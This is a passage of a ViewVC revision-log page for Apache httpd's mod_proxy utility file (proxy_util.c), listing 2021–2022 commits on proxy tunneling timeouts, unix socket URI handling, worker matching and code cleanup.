([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1899547))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1899547)

Modified
*Mon Apr 4 08:24:09 2022 UTC*
(2 years, 9 months ago)
by *icing*

File length: 187154 byte(s)

Diff to [previous 1898255](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1898255&r2=1899547)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1898255&r2=1899547&diff_format=h))
```
  *) core/mod_http/mod_http2:
     - adds new meta bucket types REQUEST, RESPONSE and HEADERS to the API.
     - adds a new method for setting standard response headers Date and Server
     - adds helper methods for formatting parts of HTTP/1.x, like headers and
       end chunks for use in non-core parts of the server, e.g. mod_proxy
     - splits the HTTP_IN filter into a "generic HTTP" and "specific HTTP/1.x"
       filter. The latter one named HTTP1_BODY_IN.
     - Uses HTTP1_BODY_IN only for requests with HTTP version <= 1.1
     - Removes the chunked input simulation from mod_http2
     - adds body_indeterminate flag to request_rec that indicates that a request
       body may be present and needs to be read/discarded. This replaces logic
       that thinks without Content-Length and Transfer-Encoding, no request
       body can exist.

```

---

Revision [**1898255**](/viewvc?view=revision&revision=1898255) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1898255&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1898255&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1898255))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1898255)

Modified
*Sun Feb 20 15:08:30 2022 UTC*
(2 years, 11 months ago)
by *jailletc36*

File length: 187101 byte(s)

Diff to [previous 1898127](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1898127&r2=1898255)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1898127&r2=1898255&diff_format=h))
```
Remove some APR 0.x stuff.

The minimum supported version is 1.3 in 2.4.x

```

---

Revision [**1898127**](/viewvc?view=revision&revision=1898127) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1898127&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1898127&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1898127))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1898127)

Modified
*Wed Feb 16 12:35:36 2022 UTC*
(2 years, 11 months ago)
by *rpluem*

File length: 187209 byte(s)

Diff to [previous 1895986](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1895986&r2=1898127)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1895986&r2=1898127&diff_format=h))
```
* Change the logic to choose the maximum of both timeouts (front end socket,
  backend socket) instead of the minimum as backend timeouts can be
  configured more selectively (per worker if needed) as front end timeouts
  and typically the backend timeouts reflect the application requirements
  better.

PR: 65886

```

---

Revision [**1895986**](/viewvc?view=revision&revision=1895986) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1895986&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1895986&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1895986))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1895986)

Modified
*Wed Dec 15 12:47:05 2021 UTC*
(3 years, 1 month ago)
by *ylavic*

File length: 187210 byte(s)

Diff to [previous 1895981](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1895981&r2=1895986)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1895981&r2=1895986&diff_format=h))
```
mod_proxy: Axe useless setting of *balancer to NULL in ap_proxy_pre_request()

It's already NULL per the enclosing "if" test.

Also, while at a non-functional change, break a close long log line to <80 col.

```

---

Revision [**1895981**](/viewvc?view=revision&revision=1895981) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1895981&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1895981&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1895981))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1895981)

Modified
*Wed Dec 15 11:35:36 2021 UTC*
(3 years, 1 month ago)
by *ylavic*

File length: 187275 byte(s)

Diff to [previous 1895914](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1895914&r2=1895981)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1895914&r2=1895981&diff_format=h))
```
mod_proxy: follow up to [r1895921](/viewvc?view=revision&revision=1895921): Don't prevent forwarding URIs w/ no hostname.

[r1895921](/viewvc?view=revision&revision=1895921) changed proxy_detect() to disable forward proxying for URIs with no
hostname which is wrong, there might exist a third-party proxy module handling
the "urn:" scheme for instance (thanks Roy for the catch!).

For this to work, we also need to leave the forward proxied URI alone in
ap_proxy_pre_request() with no UDS special case or alike, a proxy module can
then catch (or not) the original URI as expected.

```

---

Revision [**1895914**](/viewvc?view=revision&revision=1895914) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1895914&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1895914&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1895914))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1895914)

Modified
*Mon Dec 13 18:07:22 2021 UTC*
(3 years, 1 month ago)
by *ylavic*

File length: 187076 byte(s)

Diff to [previous 1895304](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1895304&r2=1895914)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1895304&r2=1895914&diff_format=h))
```
mod_proxy: Detect unix: scheme syntax errors at load time.

* modules/proxy/mod_proxy.c(add_pass, add_member, set_proxy_param,
                            proxysection):
  Check return value of ap_proxy_de_socketfy().

* modules/proxy/proxy_util.c(ap_proxy_get_worker_ex):
  Check return value of ap_proxy_de_socketfy().

```

---

Revision [**1895304**](/viewvc?view=revision&revision=1895304) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1895304&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1895304&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1895304))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1895304)

Modified
*Wed Nov 24 17:49:47 2021 UTC*
(3 years, 2 months ago)
by *ylavic*

File length: 187033 byte(s)

Diff to [previous 1894290](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1894290&r2=1895304)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1894290&r2=1895304&diff_format=h))
```
mod_proxy: SetEnv proxy-nohalfclose to disable half-close tunneling. PR 65662.

Some connect/wstunnel protocols might want half-close forwarding while some
might not, let's provide an r->subprocess_env opt-out.

```

---

Revision [**1894290**](/viewvc?view=revision&revision=1894290) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1894290&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1894290&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1894290))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1894290)

Modified
*Fri Oct 15 11:09:32 2021 UTC*
(3 years, 3 months ago)
by *ylavic*

File length: 186597 byte(s)

Diff to [previous 1893603](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1893603&r2=1894290)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1893603&r2=1894290&diff_format=h))
```
mod_proxy_connect: Honor the smallest of the backend or client timeout.

It seems that mod_proxy_connect has never applied any timeout in its tunneling
loop. Address this by setting a default timeout in ap_proxy_tunnel_create()
since mod_proxy_connect does not overwrite tunnel->timeout (while proxy_http
and proxy_wstunnel do).

This default timeout is set to the smallest of the backend side or the client
side timeout.

PR 65631, 65662, 65689

```

---

Revision [**1893603**](/viewvc?view=revision&revision=1893603) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1893603&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1893603&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1893603))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1893603)

Modified
*Fri Sep 24 15:52:50 2021 UTC*
(3 years, 4 months ago)
by *ylavic*

File length: 186234 byte(s)

Diff to [previous 1893595](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1893595&r2=1893603)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1893595&r2=1893603&diff_format=h))
```
mod_proxy: Add tunnel_forward hook.

* modules/proxy/mod_proxy.h, modules/proxy/mod_proxy.c:
  Declare/implement the hook.

* modules/proxy/proxy_util.c(proxy_transfer):
  Run tunnel_forward hooks when called by the tunneling loop.
  Simpler input/output brigade cleanup on exit.

```

---

Revision [**1893595**](/viewvc?view=revision&revision=1893595) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1893595&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1893595&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1893595))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1893595)

Modified
*Fri Sep 24 11:25:42 2021 UTC*
(3 years, 4 months ago)
by *ylavic*

File length: 184554 byte(s)

Diff to [previous 1893594](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1893594&r2=1893595)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1893594&r2=1893595&diff_format=h))
```
mod_proxy: Handle ap_proxy_buckets_lifetime_transform() errors.

* modules/proxy/mod_proxy.h,modules/proxy/proxy_util.c:
  Add ap_proxy_fill_error_brigade() to factorize proxy error handling
  on the client connection side.

* modules/proxy/mod_proxy_{http,ajp,uwsgi}.c:
  Use ap_proxy_fill_error_brigade() where needed, including when an
  empty brigade is returned on the backend side or when calling
  ap_proxy_buckets_lifetime_transform fails.

```

---

Revision [**1893594**](/viewvc?view=revision&revision=1893594) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1893594&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1893594&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1893594))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1893594)

Modified
*Fri Sep 24 10:27:16 2021 UTC*
(3 years, 4 months ago)
by *ylavic*

File length: 183109 byte(s)

Diff to [previous 1893593](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1893593&r2=1893594)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1893593&r2=1893594&diff_format=h))
```
mod_proxy: Restore ap_proxy_transfer_between_connections().

* modules/proxy/mod_proxy.h:
  Restore the interface of ap_proxy_transfer_between_connections() back to
  before MMN 20210506.0.
  Add ap_proxy_tunnel_conn_bytes_in() and ap_proxy_tunnel_conn_bytes_out().
  New proxy_tunnel_conn_t typedef'ed from opaque struct proxy_tunnel_conn.

* modules/proxy/mod_proxy.h(ap_proxy_tunnel_conn_get_read,
                            ap_proxy_tunnel_conn_get_transferred):
  Axed/replaced by ap_proxy_tunnel_conn_bytes_in() and
  ap_proxy_tunnel_conn_bytes_out().

* modules/proxy/proxy_util.c(struct proxy_tunnel_conn):
  Replace "exchanged" by "bytes_in" and "bytes_out".

* modules/proxy/proxy_util.c(proxy_transfer):
  New helper implementing ap_proxy_transfer_between_connections() and
  returning both &bytes_in and &bytes_out.

* modules/proxy/proxy_util.c(ap_proxy_transfer_between_connections):
  Now calls proxy_transfer().

* modules/proxy/proxy_util.c(ap_proxy_tunnel_conn_bytes_in,
                             ap_proxy_tunnel_conn_bytes_out):
  Return tc->bytes_in and tc->bytes_out respectively.

* modules/proxy/proxy_util.c(proxy_tunnel_forward):
  Use proxy_transfer() which updates in->bytes_in, &out->bytes_out.
  tunnel->replied will be updated in proxy_tunnel_run().

* modules/proxy/proxy_util.c(proxy_tunnel_forward):
  Fall through the "done" label in any case to set tunnel->replied based
  on tunnel->client->bytes_out > 0.

* modules/proxy/mod_proxy_http.c(ap_proxy_http_process_response):
  Use ap_proxy_tunnel_conn_bytes_{in,out}() for worker->s->{read,transferred}
  accounting.

* modules/proxy/mod_proxy_http.c(proxy_http_async_finish):
  Update worker->s->{read,transferred} when async too.

```

---

Revision [**1893593**](/viewvc?view=revision&revision=1893593) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1893593&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1893593&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1893593))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1893593)

Modified
*Fri Sep 24 10:09:23 2021 UTC*
(3 years, 4 months ago)
by *ylavic*

File length: 182468 byte(s)

Diff to [previous 1893519](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1893519&r2=1893593)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1893519&r2=1893593&diff_format=h))
```
mod_proxy: typedef struct proxy_tunnel_conn proxy_tunnel_conn_t.

```

---

Revision [**1893519**](/viewvc?view=revision&revision=1893519) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1893519&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1893519&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1893519))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1893519)

Modified
*Wed Sep 22 18:47:09 2021 UTC*
(3 years, 4 months ago)
by *ylavic*

File length: 182508 byte(s)

Diff to [previous 1893184](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1893184&r2=1893519)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1893184&r2=1893519&diff_format=h))
```
mod_proxy: Handle UDS URIs with empty hostname as if they had no hostname.

It was reported to me (privately) that [r1893101](/viewvc?view=revision&revision=1893101) broke existing settings like:
  SetHandler "proxy:unix:///path/to/uds.sock|fcgi://localhost/"

RFC 3986 (section 3.2.2) says that:
   If the URI scheme defines a default for host, then that default
   applies when the host subcomponent is undefined or when the
   registered name is empty (zero length).  For example, the "file" URI
   scheme is defined so that no authority, an empty host, and
   "localhost" all mean the end-user's machine, whereas the "http"
   scheme considers a missing authority or empty host invalid.

Let's consider that the "unix" scheme is closer to the "file" scheme than
the "http" one, and accept "unix:///path/to/uds.sock" as a valid URI.

```

---

Revision [**1893184**](/viewvc?view=revision&revision=1893184) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1893184&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1893184&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1893184))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1893184)

Modified
*Thu Sep 9 16:55:24 2021 UTC*
(3 years, 4 months ago)
by *ylavic*

File length: 182432 byte(s)

Diff to [previous 1892987](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1892987&r2=1893184)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1892987&r2=1893184&diff_format=h))
```
core: Add ap_create_connection() to create a server or client/proxy connection.

c->outgoing shouldn't be set by mod_ssl, ap_create_connection() allows that
and this commit also replaces all the calls to ap_run_create_connection() in
mod_proxy modules (not in the MPMs which create incoming connections only).

* include/http_connection.h, server/connection.c:
  Declare and implement ap_create_connection().

* modules/proxy/proxy_util.c, modules/proxy/mod_proxy_connect.c,
  modules/proxy/mod_proxy_ftp.c:
  Use ap_create_connection() instead of ap_run_create_connection(), and don't
  provide a connection_id a scoreboard handle for outgoing connection.

* server/log.c(do_errorlog_default):
  Use c->outgoing instead of c->sbh to determine if it's a "client" or "remote"
  connection.

```

---

Revision [**1892987**](/viewvc?view=revision&revision=1892987) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1892987&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1892987&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1892987))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1892987)

Modified
*Mon Sep 6 11:21:49 2021 UTC*
(3 years, 4 months ago)
by *ylavic*

File length: 182489 byte(s)

Diff to [previous 1892986](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1892986&r2=1892987)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1892986&r2=1892987&diff_format=h))
```
mod_proxy: Follow up to [r1892986](/viewvc?view=revision&revision=1892986): APLOGNO()

Stefan get out of this body! :)

```

---

Revision [**1892986**](/viewvc?view=revision&revision=1892986) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1892986&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1892986&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1892986))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1892986)

Modified
*Mon Sep 6 11:06:53 2021 UTC*
(3 years, 4 months ago)
by *ylavic*

File length: 182484 byte(s)

Diff to [previous 1892921](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1892921&r2=1892986)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1892921&r2=1892986&diff_format=h))
```
mod_proxy: Follow up to [r1892814](/viewvc?view=revision&revision=1892814).

* modules/proxy/proxy_util.c(fix_uds_filename):
  Sanity checks on the configured UDS path, fail with 500 if invalid since
  continuing through proxy processing wouldn't work as expected.

```

---

Revision [**1892921**](/viewvc?view=revision&revision=1892921) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1892921&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1892921&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1892921))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1892921)

Modified
*Sun Sep 5 08:31:04 2021 UTC*
(3 years, 4 months ago)
by *jailletc36*

File length: 182131 byte(s)

Diff to [previous 1892851](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1892851&r2=1892921)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1892851&r2=1892921&diff_format=h))
```
Fix a compilation error in the configuration where this is compiled.

Unless I missed something, it is broken since [r1516930](/viewvc?view=revision&revision=1516930) (Aug 23 2013).

So no-one has compiled this for more than 8 years.
Sounds like dead code.

```

---

Revision [**1892851**](/viewvc?view=revision&revision=1892851) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1892851&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1892851&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1892851))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1892851)

Modified
*Fri Sep 3 11:08:16 2021 UTC*
(3 years, 4 months ago)
by *ylavic*

File length: 182133 byte(s)

Diff to [previous 1892814](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1892814&r2=1892851)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1892814&r2=1892851&diff_format=h))
```
mod_proxy: Follow up to [r1892740](/viewvc?view=revision&revision=1892740).

Really remove the old ap_filter_input_pending() handling forgotten by [r1892740](/viewvc?view=revision&revision=1892740).

```

---

Revision [**1892814**](/viewvc?view=revision&revision=1892814) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1892814&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1892814&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1892814))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1892814)

Modified
*Thu Sep 2 12:37:02 2021 UTC*
(3 years, 4 months ago)
by *ylavic*

File length: 182608 byte(s)

Diff to [previous 1892740](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1892740&r2=1892814)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1892740&r2=1892814&diff_format=h))
```
mod_proxy: Faster unix socket path parsing in the "proxy:" URL.

The actual r->filename format is "[proxy:]unix:path|url" for UDS, no need to
strstr(,"unix:") since it's at the start of the string.

```

---

Revision [**1892740**](/viewvc?view=revision&revision=1892740) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1892740&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1892740&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1892740))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1892740)

Modified
*Mon Aug 30 18:04:20 2021 UTC*
(3 years, 4 months ago)
by *ylavic*

File length: 182578 byte(s)

Diff to [previous 1892468](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1892468&r2=1892740)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1892468&r2=1892740&diff_format=h))
```
mod_proxy: Fix potential tunneling infinite loop and spurious timeout.
           PRs 65521 and 65519.

* modules/proxy/proxy_util.c(ap_proxy_tunnel_run):
  Avoid an infinite loop by shutting down the connection for write when poll()
  returns POLLHUP and read is already down.  PR 65521.

* modules/proxy/proxy_util.c(ap_proxy_tunnel_run):
  When write completion is finished don't check for ap_filter_input_pending()
  before proxy_tunnel_forward() to flush input data, this is a nonblocking read
  already which will do the same thing implicitely. ap_filter_input_pending()
  is broken in 2.4.x without the whole pending data mechanism (not backported
  yet), so let's align here.  PR 65519.

```

---

Revision [**1892468**](/viewvc?view=revision&revision=1892468) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1892468&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1892468&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1892468))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1892468)

Modified
*Fri Aug 20 09:36:19 2021 UTC*
(3 years, 5 months ago)
by *ylavic*

File length: 181668 byte(s)

Diff to [previous 1891591](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1891591&r2=1892468)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1891591&r2=1892468&diff_format=h))
```
core: follow up to [r1891148](/viewvc?view=revision&revision=1891148): WC bucket defaulting to FLUSH bucket.

Define WC bucket semantics as:
/**
 * @brief Write Completion (WC) bucket
 *
 * A WC bucket is a FLUSH bucket with special ->data == &ap_bucket_wc_data,
 * still both AP_BUCKET_IS_WC() and APR_BUCKET_IS_FLUSH() hold for them so
 * they have the same semantics for most filters, namely:
 *   Everything produced before shall be passed to the next filter, including
 *   the WC/FLUSH bucket itself.
 * The distinction between WC and FLUSH buckets is only for filters that care
 * about write completion (calling ap_filter_reinstate_brigade() with non-NULL
 * flush_upto), those can setaside WC buckets and the preceding data provided
 * they have first determined that the next filter(s) have pending data
 * already, usually by calling ap_filter_should_yield(f->next).
 */

The only filters that care about write completion for now are
ap_core_output_filter() and ssl_io_filter_output(), which try to fill
in the pipe as much as possible, using ap_filter_reinstate_brigade(&flush_upto)
to determine whether they should flush (blocking) or setaside their remaining
data.

So ap_filter_reinstate_brigade() is made to not treat WC as FLUSH buckets and
keep the above filters working as before (and correctly w.r.t. above WC bucket
semantics).

* include/ap_mmn.h, include/util_filter.h:
  Axe specific ap_bucket_type_wc and define global &ap_bucket_wc_data address to
  mark WC buckets checked by AP_BUCKET_IS_WC().

* server/util_filter.c (ap_filter_reinstate_brigade):
  Don't treat WC buckets as FLUSH buckets.

```

---

Revision [**1891591**](/viewvc?view=revision&revision=1891591) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1891591&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1891591&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1891591))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1891591)

Modified
*Fri Jul 16 16:18:44 2021 UTC*
(3 years, 6 months ago)
by *jailletc36*

File length: 181597 byte(s)

Diff to [previous 1891477](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1891477&r2=1891591)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1891477&r2=1891591&diff_format=h))
```
Follow-up to [r1891477](/viewvc?view=revision&revision=1891477).

Axe a few lines of code and document a potential optimization

```

---

Revision [**1891477**](/viewvc?view=revision&revision=1891477) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1891477&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1891477&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1891477))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1891477)

Modified
*Mon Jul 12 10:32:21 2021 UTC*
(3 years, 6 months ago)
by *ylavic*

File length: 181657 byte(s)

Diff to [previous 1891284](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1891284&r2=1891477)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1891284&r2=1891477&diff_format=h))
```
mod_proxy: Fix icomplete initialization of BalancerMember(s) from the manager.

Clear the workers created in ap_proxy_sync_balancer(), notably ->local_status
for below ap_proxy_initialize_worker() to initialize all the child structures
like ->cp and ->cp->reslist, avoiding a possible crash when the workers are
used at runtime.

```

---

Revision [**1891284**](/viewvc?view=revision&revision=1891284) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1891284&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1891284&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1891284))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=1891284)

Modified
*Mon Jul 5 16:23:33 2021 UTC*
(3 years, 6 months ago)
by *ylavic*

File length: 181677 byte(s)

Diff to [previous 1891216](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1891216&r2=1891284)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=1891216&r2=1891284&diff_format=h))
```
mod_proxy: Avoid confusion of prefix/regex matching workers at loading.  PR 65429.

ap_proxy_get_worker() needs to know whether it should lookup for prefix or
match or both matching workers, depending on the context.

For instance <Proxy[Match]> or ProxyPass[Match] directives need to lookup for
an existing worker with the same type as the directive (*Match or not), because
they will define one with that matching type if none exists.

On the contrary, "ProxySet <url>" at load time or ap_proxy_pre_request() at run
time need to find a worker matching an url whether it's by prefix or by regex.

So this commit adds ap_proxy_get_worker_ex() which takes a bitmask for the
matching type and calls it appropriately where needed.

For consistency, ap_proxy_define_worker_ex() is also added, using the same
bitmask flags, deprecating ap_proxy_define_match_worker().

Follow up to [r1891206](/viewvc?view=revision&revision=1891206).

```

---

Revision [**1891216**](/viewvc?view=revision&revision=1891216) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1891216&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=1891216&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=1891216))
